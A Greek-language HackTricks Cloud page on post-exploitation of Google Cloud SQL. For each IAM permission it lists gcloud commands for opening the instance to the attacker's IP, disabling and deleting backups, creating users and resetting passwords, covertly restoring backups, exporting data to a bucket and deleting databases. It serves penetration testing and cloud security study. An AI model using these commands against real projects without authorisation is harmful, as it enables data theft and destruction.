# GCP - Μετά την Εκμετάλλευση του Cloud SQL

<details>

<summary><strong>Μάθετε το hacking του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF**, ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα hacking tricks σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## Cloud SQL

Για περισσότερες πληροφορίες σχετικά με το Cloud SQL, ελέγξτε:

{% content-ref url="../gcp-services/gcp-cloud-sql-enum.md" %}
[gcp-cloud-sql-enum.md](../gcp-services/gcp-cloud-sql-enum.md)
{% endcontent-ref %}

### `cloudsql.instances.update`, (`cloudsql.instances.get`)

Για να συνδεθείτε στις βάσεις δεδομένων, χρειάζεστε απλώς πρόσβαση στη θύρα της βάσης δεδομένων και να γνωρίζετε το όνομα χρήστη και τον κωδικό πρόσβασης, δεν υπάρχουν απαιτήσεις IAM. Έτσι, ένας εύκολος τρόπος να αποκτήσετε πρόσβαση, υποθέτοντας ότι η βάση δεδομένων έχει δημόσια διεύθυνση IP, είναι να ενημερώσετε τις επιτρεπόμενες δικτυακές διευθύνσεις και να **επιτρέψετε τη διεύθυνση IP του δικού σας υπολογιστή να έχει πρόσβαση**.
```bash
# Use --assign-ip to make the database get a public IPv4
gcloud sql instances patch $INSTANCE_NAME \
--authorized-networks "$(curl ifconfig.me)" \
--assign-ip \
--quiet

mysql -h <ip_db> # If mysql

# With cloudsql.instances.get you can use gcloud directly
gcloud sql connect mysql --user=root --quiet
```
Είναι επίσης δυνατόν να χρησιμοποιηθεί το **`--no-backup`** για να **διακόψει τα αντίγραφα ασφαλείας** της βάσης δεδομένων.

Όσον αφορά τις απαιτήσεις, δεν είμαι εντελώς σίγουρος για ποιο είναι το δικαίωμα **`cloudsql.instances.connect`** και **`cloudsql.instances.login`**. Εάν το γνωρίζετε, στείλτε ένα αίτημα ενσωμάτωσης (PR)!

### `cloudsql.users.list`

Λάβετε μια **λίστα με όλους τους χρήστες** της βάσης δεδομένων:
```bash
gcloud sql users list --instance <intance-name>
```
### `cloudsql.users.create`

Αυτή η άδεια επιτρέπει τη **δημιουργία ενός νέου χρήστη μέσα** στη βάση δεδομένων:
```bash
gcloud sql users create <username> --instance <instance-name> --password <password>
```
### `cloudsql.users.update`

Αυτή η άδεια επιτρέπει την **ενημέρωση του χρήστη μέσα** στη βάση δεδομένων. Για παράδειγμα, μπορείτε να αλλάξετε τον κωδικό πρόσβασής του:

{% code overflow="wrap" %}
```bash
gcloud sql users set-password <username> --instance <instance-name> --password <password>
```
{% endcode %}

### `cloudsql.instances.restoreBackup`, `cloudsql.backupRuns.get`

Οι αντίγραφα ασφαλείας μπορεί να περιέχουν **παλιές ευαίσθητες πληροφορίες**, επομένως είναι ενδιαφέρον να τα ελέγξετε.\
**Επαναφέρετε ένα αντίγραφο ασφαλείας** μέσα σε μια βάση δεδομένων:
```bash
gcloud sql backups restore <backup-id> --restore-instance <instance-id>
```
Για να το κάνετε με πιο αόρατο τρόπο, συνιστάται να δημιουργήσετε μια νέα περίπτωση SQL και να ανακτήσετε τα δεδομένα εκεί αντί να τα ανακτήσετε στις τρέχουσες βάσεις δεδομένων.

### `cloudsql.backupRuns.delete`

Αυτή η άδεια επιτρέπει τη διαγραφή αντιγράφων ασφαλείας:
```bash
gcloud sql backups delete <backup-id> --instance <instance-id>
```
### `cloudsql.instances.export`, `storage.objects.create`

**Εξαγωγή μιας βάσης δεδομένων** σε ένα Cloud Storage Bucket ώστε να μπορείτε να την προσπελάσετε από εκεί:
```bash
# Export sql format, it could also be csv and bak
gcloud sql export sql <instance-id> <gs://bucketName/fileName>
```
### `cloudsql.instances.import`, `storage.objects.get`

**Εισαγωγή μιας βάσης δεδομένων** (αντικατάσταση) από ένα Cloud Storage Bucket:
```bash
# Import format SQL, you could also import formats bak and csv
gcloud sql import sql <instance-id> <gs://bucketName/fileName>
```
### `cloudsql.databases.delete`

Διαγράψτε μια βάση δεδομένων από το παράδειγμα βάσης δεδομένων:
```bash
gcloud sql databases delete <db-name> --instance <instance-id>
```
<details>

<summary><strong>Μάθετε το hacking του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΠΛΑΝΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα hacking tricks σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
